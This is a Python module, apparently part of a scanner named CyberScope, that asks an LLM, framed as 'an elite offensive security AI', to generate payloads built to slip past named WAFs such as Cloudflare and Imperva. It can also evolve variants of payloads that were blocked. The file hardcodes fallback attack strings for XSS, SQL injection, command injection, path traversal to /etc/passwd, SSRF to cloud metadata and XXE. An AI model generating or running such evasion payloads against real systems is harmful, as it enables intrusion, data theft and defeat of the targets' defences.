"""
CyberScope v7.8 · AI Payload Generator (WAF-aware evolution).

Given a target category (xss/sqli/cmd) + optional WAF hint, uses the LLM
(via Emergent LLM key) to generate 20-50 novel payloads tuned to bypass
that specific WAF.  Then classifies confidence and returns them for the
mutation engine / injection scanners to try.

Also supports "payload evolution": user provides payloads that FAILED,
and the LLM generates variants that avoid those exact patterns.
"""
from __future__ import annotations

import json
import os
from typing import Any, Dict, List, Optional


COMMON_WAFS = [
    'Cloudflare', 'Akamai', 'Imperva', 'AWS WAF', 'F5 BIG-IP',
    'Fortinet FortiWeb', 'Barracuda', 'Radware', 'Sucuri',
    'ModSecurity (OWASP CRS)', 'Wordfence', 'None',
]

CATEGORIES = ['xss', 'sqli', 'cmd', 'lfi', 'ssrf', 'ssti', 'nosqli', 'xxe']


async def _ask_llm(system: str, prompt: str) -> str:
    key = os.environ.get('EMERGENT_LLM_KEY')
    if not key:
        return ''
    try:
        from emergentintegrations.llm.chat import LlmChat, UserMessage
        chat = (LlmChat(api_key=key, session_id='payload-gen', system_message=system)
                .with_model('anthropic', 'claude-sonnet-4-20250514'))
        return await chat.send_message(UserMessage(text=prompt)) or ''
    except Exception:
        return ''


def _extract_payloads(text: str) -> List[str]:
    """
    Robustly extract payloads from an LLM reply.  Tries JSON array first,
    then falls back to code-block extraction, then line-by-line.
    """
    if not text:
        return []
    # 1) JSON array
    try:
        start = text.find('[')
        end = text.rfind(']')
        if start != -1 and end > start:
            arr = json.loads(text[start:end + 1])
            if isinstance(arr, list):
                return [str(x) for x in arr if isinstance(x, (str, int, float))][:60]
    except Exception:
        pass
    # 2) Fenced code blocks — one payload per line
    lines: List[str] = []
    in_fence = False
    for line in text.splitlines():
        if line.strip().startswith('```'):
            in_fence = not in_fence
            continue
        if in_fence:
            lines.append(line.rstrip())
        elif line.startswith(('- ', '* ', '1. ', '2. ')):
            lines.append(line.lstrip('-*0123456789. ').rstrip())
    payloads = [ln for ln in lines if ln and len(ln) < 500]
    return payloads[:60]


async def generate_payloads(
    category: str,
    waf: str = 'None',
    count: int = 30,
    context: str = '',
    avoid: Optional[List[str]] = None,
) -> Dict[str, Any]:
    """
    Ask the AI to produce `count` payloads for the given category+WAF.
    `avoid` is a list of payloads that previously failed — the AI generates
    variants that dodge those exact patterns.

    Returns {payloads: [...], reason: str, raw: str}.
    """
    if category not in CATEGORIES:
        return {'payloads': [], 'reason': f'unsupported_category:{category}'}

    avoid = avoid or []
    system = (
        f"You are an elite offensive security AI specialising in {category.upper()} "
        f"payloads. Your target is protected by the WAF: {waf}. Generate "
        f"{count} novel, high-quality payloads designed to bypass that WAF. "
        "Return a JSON array of strings — payloads only, no prose."
    )
    prompt = (
        f"Context: {context or 'generic web app'}\n"
        f"Avoid these payload patterns (they were blocked): {avoid[:20]}\n\n"
        f"Return ONLY a JSON array of {count} {category} payloads."
    )
    raw = await _ask_llm(system, prompt)
    payloads = _extract_payloads(raw) if raw else []

    # Sensible fallback so the UI never gets an empty list
    if not payloads:
        payloads = _fallback_payloads(category)[:count]
        reason = 'llm_unavailable_used_fallback'
    else:
        reason = f'{len(payloads)} payloads from LLM tuned for {waf}'

    return {
        'category': category,
        'waf': waf,
        'count': len(payloads),
        'payloads': payloads,
        'reason': reason,
        'raw': raw[:800],
    }


def _fallback_payloads(cat: str) -> List[str]:
    FB = {
        'xss': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><svg/onload=alert(1)>',
            'javascript:alert(1)',
            '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
        ],
        'sqli': ["' OR 1=1--", "') OR ('a'='a", '" OR 1=1#',
                 "' UNION SELECT NULL-- -", "'; WAITFOR DELAY '0:0:5'--"],
        'cmd': [';id', '|id', '`id`', '$(id)', '&&whoami'],
        'lfi': ['../../etc/passwd', '..%2f..%2fetc/passwd',
                'php://filter/convert.base64-encode/resource=index.php'],
        'ssrf': ['http://127.0.0.1', 'http://169.254.169.254/latest/meta-data/',
                 'file:///etc/passwd', 'gopher://127.0.0.1:6379/_INFO'],
        'ssti': ['{{7*7}}', '${{7*7}}', '<%= 7*7 %>', '#{7*7}'],
        'nosqli': ["' || 'a'=='a", '{"$ne":null}', '{"$gt":""}'],
        'xxe': ['<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>'],
    }
    return FB.get(cat, [])
